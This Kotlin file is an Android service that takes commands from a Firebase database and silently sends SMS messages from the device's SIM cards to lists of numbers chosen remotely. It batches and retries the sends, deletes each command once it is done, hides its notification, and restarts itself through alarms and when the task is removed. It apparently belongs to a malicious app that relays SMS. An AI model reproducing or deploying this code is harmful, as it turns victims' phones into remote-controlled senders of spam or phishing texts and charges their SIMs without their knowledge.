package com.rto1p8.app.service

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.*
import android.telephony.SmsManager
import android.telephony.SubscriptionManager
import androidx.core.app.NotificationCompat
import com.google.firebase.database.*
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import com.rto1p8.app.MainActivity
import com.rto1p8.app.utils.Logger
import kotlinx.coroutines.*
import java.util.Collections
import java.util.concurrent.ConcurrentHashMap

class SmsService : Service() {
    companion object {
        private const val CHANNEL_ID = "SmsServiceChannel"
        private const val NOTIFICATION_ID = 1
        private const val RESTART_INTERVAL_MS = 5 * 60 * 1000L // 5 minutes
        private const val SMS_BATCH_DELAY_MS = 60_000L // 1 minute
        private const val MAX_RETRIES = 3
    }

    private val coroutineScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val sentSmsTracker = ConcurrentHashMap<String, MutableSet<String>>()
    private var commandsRef: DatabaseReference? = null
    private var valueEventListener: ValueEventListener? = null

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        initService()
    }

    private fun initService() {
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, buildForegroundNotification())
        schedulePeriodicRestart()
        setupFirebaseListener()
    }

    private fun setupFirebaseListener() {
        coroutineScope.launch {
            try {
                val deviceId = MainActivity.getDeviceId(this@SmsService)
                commandsRef = Firebase.database.getReference("Device/$deviceId/send_sms_commands")

                // Remove previous listener if exists
                valueEventListener?.let { commandsRef?.removeEventListener(it) }

                valueEventListener = object : ValueEventListener {
                    override fun onDataChange(snapshot: DataSnapshot) {
                        coroutineScope.launch {
                            processPendingCommands(snapshot)
                        }
                    }

                    override fun onCancelled(error: DatabaseError) {
                        Logger.error("Database error: ${error.message}", error.toException())
                        // Schedule retry with exponential backoff
                        coroutineScope.launch {
                            delay(10_000L)
                            setupFirebaseListener()
                        }
                    }
                }
                commandsRef?.addValueEventListener(valueEventListener as ValueEventListener)
            } catch (e: Exception) {
                Logger.error("Failed to setup Firebase listener: ${e.message}", e)
            }
        }
    }

    private suspend fun processPendingCommands(snapshot: DataSnapshot) {
        snapshot.children.forEach { commandSnapshot ->
            val command = commandSnapshot.value as? Map<*, *> ?: return@forEach
            if (command["status"] as? String == "pending") {
                val simSlot = command["sim_slot"] as? String ?: return@forEach
                val recipients = command["recipients"] as? List<*> ?: return@forEach
                val message = command["message"] as? String ?: return@forEach

                val validRecipients = recipients.filterIsInstance<String>().filter { it.isNotBlank() }
                if (validRecipients.isNotEmpty()) {
                    sendSmsBatch(simSlot, validRecipients, message, commandSnapshot.key!!)
                }
            }
        }
    }

    private suspend fun sendSmsBatch(simSlot: String, recipients: List<String>, message: String, commandId: String) {
        try {
            val smsManager = getSmsManager(simSlot)
            val chunks = recipients.chunked(10)
            val alreadySentSet = sentSmsTracker.getOrPut(commandId) { Collections.synchronizedSet(mutableSetOf()) }

            chunks.forEachIndexed { index, batch ->
                batch.forEach { number ->
                    if (alreadySentSet.contains(number)) {
                        Logger.log("Skipping duplicate SMS to $number for command $commandId")
                        return@forEach
                    }

                    try {
                        smsManager.sendTextMessage(number, null, message, null, null)
                        Logger.log("Sent SMS from $simSlot to $number")
                        alreadySentSet.add(number)
                        updateRecipientsInFirebase(number, commandId)
                    } catch (e: Exception) {
                        Logger.error("Failed to send SMS to $number: ${e.message}", e)
                        if (!retrySend(smsManager, number, message, alreadySentSet, commandId, 0)) {
                            Logger.error("Max retries reached for $number", e)
                        }
                    }
                }
                if (index < chunks.size - 1) {
                    delay(SMS_BATCH_DELAY_MS)
                }
            }
        } catch (e: Exception) {
            Logger.error("Failed to process SMS batch: ${e.message}", e)
        }
    }

    private suspend fun retrySend(
        smsManager: SmsManager,
        number: String,
        message: String,
        alreadySentSet: MutableSet<String>,
        commandId: String,
        retryCount: Int
    ): Boolean {
        if (retryCount >= MAX_RETRIES) return false

        try {
            delay(10_000L)
            smsManager.sendTextMessage(number, null, message, null, null)
            Logger.log("Sent SMS retry attempt ${retryCount + 1} from to $number")
            alreadySentSet.add(number)
            updateRecipientsInFirebase(number, commandId)
            return true
        } catch (e: Exception) {
            Logger.error("Retry ${retryCount + 1} failed for $number: ${e.message}", e)
            return retrySend(smsManager, number, message, alreadySentSet, commandId, retryCount + 1)
        }
    }

    private fun getSmsManager(simSlot: String): SmsManager {
        val subscriptionManager = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
        val subInfoList = subscriptionManager.activeSubscriptionInfoList ?: return SmsManager.getDefault()

        val slotIndex = when (simSlot) {
            "sim1" -> 0
            "sim2" -> 1
            else -> return SmsManager.getDefault()
        }

        val subId = subInfoList.find { it.simSlotIndex == slotIndex }?.subscriptionId
        return subId?.let {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                SmsManager.getSmsManagerForSubscriptionId(it)
            } else {
                SmsManager.getDefault()
            }
        } ?: SmsManager.getDefault()
    }

    private suspend fun updateRecipientsInFirebase(number: String, commandId: String) {
        withContext(Dispatchers.IO) {
            val deviceId = MainActivity.getDeviceId(this@SmsService)
            val commandRef = Firebase.database.getReference("Device/$deviceId/send_sms_commands/$commandId")

            try {
                commandRef.child("recipients").runTransaction(object : Transaction.Handler {
                    override fun doTransaction(currentData: MutableData): Transaction.Result {
                        val currentList = currentData.getValue(object : GenericTypeIndicator<MutableList<String>>() {})
                            ?: return Transaction.success(currentData)
                        currentList.remove(number)
                        currentData.value = currentList
                        return Transaction.success(currentData)
                    }

                    override fun onComplete(error: DatabaseError?, committed: Boolean, snapshot: DataSnapshot?) {
                        if (error != null) {
                            Logger.error("Transaction error: ${error.message}", error.toException())
                            return
                        }

                        val newList = snapshot?.getValue(object : GenericTypeIndicator<List<String>>() {})
                        if (committed && (newList == null || newList.isEmpty())) {
                            commandRef.removeValue()
                                .addOnSuccessListener {
                                    sentSmsTracker.remove(commandId)
                                    Logger.log("Removed command $commandId after final number sent")
                                }
                                .addOnFailureListener { e ->
                                    Logger.error("Failed to remove command: ${e.message}", e)
                                }
                        }
                    }
                })
            } catch (e: Exception) {
                Logger.error("Firebase transaction failed: ${e.message}", e)
            }
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "SMS Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Channel for SMS Service notifications"
                setShowBadge(false)
            }
            getSystemService(NotificationManager::class.java)?.createNotificationChannel(channel)
        }
    }

    private fun buildForegroundNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("SMS Service")
            .setContentText("Processing SMS commands")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build()
    }

    private fun schedulePeriodicRestart() {
        val restartIntent = Intent(this, SmsService::class.java)
        val pendingIntent = PendingIntent.getService(
            this, 0, restartIntent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        alarmManager.setInexactRepeating(
            AlarmManager.ELAPSED_REALTIME_WAKEUP,
            SystemClock.elapsedRealtime() + RESTART_INTERVAL_MS,
            RESTART_INTERVAL_MS,
            pendingIntent
        )
    }

    override fun onDestroy() {
        super.onDestroy()
        cleanup()
    }

    private fun cleanup() {
        coroutineScope.cancel()
        valueEventListener?.let { commandsRef?.removeEventListener(it) }
        sentSmsTracker.clear()
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        val restartServiceIntent = Intent(applicationContext, SmsService::class.java)
        restartServiceIntent.setPackage(packageName)
        startService(restartServiceIntent)
    }
}